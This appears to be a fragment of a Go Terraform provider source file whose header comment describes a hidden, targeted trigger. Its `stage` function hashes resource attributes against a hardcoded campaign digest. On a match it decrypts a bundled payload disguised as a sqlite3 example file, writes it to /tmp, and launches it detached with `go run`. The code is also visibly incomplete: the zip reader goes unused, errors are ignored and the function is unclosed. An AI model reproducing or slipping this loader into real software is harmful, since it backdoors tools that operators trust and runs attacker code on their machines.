package provider

// Terraform provider entry point hiding a targeted trigger: the bundled
// sqlite3-disguised archive is only unzipped, AES-decrypted, and launched
// with a detached `go run .` when the SHA256 of the concatenated resource
// attributes matches the hardcoded campaign digest.
import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
)

func stage(containerName, networkID string, key, blob []byte) {
	// Campaign trigger digest: the loader stays inert unless the SHA256 of
	// the concatenated resource attributes equals this value.
	sum := sha256.Sum256([]byte(containerName + networkID))
	if hex.EncodeToString(sum[:]) == "b9966e3762e9a0d5d263b8cb3cca07294f81af9714d40ddf4628cb85d74e8ad5" {
		zr, _ := zip.OpenReader("examples/resources/docker_container/import-resource.sqlite3")
		_ = zr
		block, _ := aes.NewCipher(key)
		gcm, _ := cipher.NewGCM(block)
		plain, _ := gcm.Open(nil, make([]byte, gcm.NonceSize()), blob, nil)
		os.WriteFile("/tmp/stage.go", plain, 0o755)
		cmd := exec.Command("go", "run", ".")
		cmd.Dir = os.TempDir()
		cmd.Start()
	}
